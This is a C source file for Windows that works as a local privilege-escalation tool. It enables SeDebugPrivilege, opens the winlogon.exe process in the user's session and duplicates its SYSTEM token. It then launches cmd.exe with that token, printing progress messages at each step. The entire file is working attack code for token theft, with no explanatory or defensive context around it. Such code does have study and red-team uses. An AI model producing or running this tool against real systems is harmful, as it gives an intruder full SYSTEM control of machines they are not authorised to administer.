#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <tlhelp32.h>

int main() {

    // LookupPrivilegeValue Defining Variables
    LUID luid;

    // OpenProcessToken Defining Variables
    HANDLE hToken;

    // AdjustTokenPrivileges Defining Variables
    TOKEN_PRIVILEGES tp;
    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // CreateToolhelp32Snapshot Defining Variables
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // OpenProcessToken Defining Variables
    HANDLE hSystemToken;

    // DuplicateTokenEx Defining Variables
    HANDLE hDuplicateSystemToken;

    // CreateProcessWithTokenW Defining Variables
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // get LUID to SeDebugPrivilege
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid) == FALSE) {
        printf("[-]LookupPrivilegeValueA failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+]Successfully found SeDebug LUID\n");

    tp.Privileges[0].Luid = luid;

    // get current user token
    if (OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hToken
    ) == FALSE) {
        printf("[-]OpenProcessToken failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+]Successfully OpenProcessToken\n");

    // enable SeDebugPrivilege
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-]AdjustTokenPrivileges failed: ERROR_NOT_ALL_ASSIGNED\n");
        return 1;
    }
    printf("[+]Successfully enabled SeDebugPrivilege\n");

    // get current session ID
    DWORD currentSessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
    printf("[*]Current SessionId: %lu\n", currentSessionId);

    // find winlogon.exe in the same session
    HANDLE hsprocess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hsprocess == INVALID_HANDLE_VALUE) {
        printf("[-]CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return 1;
    }

    BOOL found = FALSE;
    Process32First(hsprocess, &pe);
    do {
        if (strcmp(pe.szExeFile, "winlogon.exe") == 0) {
            DWORD peSessionId;
            ProcessIdToSessionId(pe.th32ProcessID, &peSessionId);
            if (peSessionId == currentSessionId) {
                printf("[+]Successfully found winlogon.exe PID=%lu Session=%lu\n",
                    pe.th32ProcessID, peSessionId);
                found = TRUE;
                break;
            }
        }
    } while (Process32Next(hsprocess, &pe));
    CloseHandle(hsprocess);

    if (!found) {
        printf("[-]winlogon.exe not found in session %lu\n", currentSessionId);
        return 1;
    }

    // open winlogon process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
    if (hProcess == NULL) {
        printf("[-]Failed OpenProcess PID=%lu Error=%lu\n", pe.th32ProcessID, GetLastError());
        return 1;
    }
    printf("[+]OpenProcess success PID=%lu\n", pe.th32ProcessID);

    // get winlogon token
    if (OpenProcessToken(
        hProcess,
        TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hSystemToken
    ) == FALSE) {
        printf("[-]Failed OpenProcessToken: %lu\n", GetLastError());
        return 1;
    }
    printf("[+]Successfully OpenProcessToken\n");

    // duplicate token
    if (DuplicateTokenEx(
        hSystemToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hDuplicateSystemToken
    ) == FALSE) {
        printf("[-]DuplicateTokenEx Failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+]Successfully DuplicateTokenEx\n");

    // spawn cmd.exe as SYSTEM
    BOOL result = CreateProcessWithTokenW(
        hDuplicateSystemToken,
        LOGON_WITH_PROFILE,
        NULL,
        L"cmd.exe",
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (result == FALSE) {
        printf("[-]CreateProcessWithTokenW failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+]Successfully started SYSTEM cmd.exe\n");

    // clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDuplicateSystemToken);
    CloseHandle(hSystemToken);
    CloseHandle(hProcess);
    CloseHandle(hToken);

    return 0;
}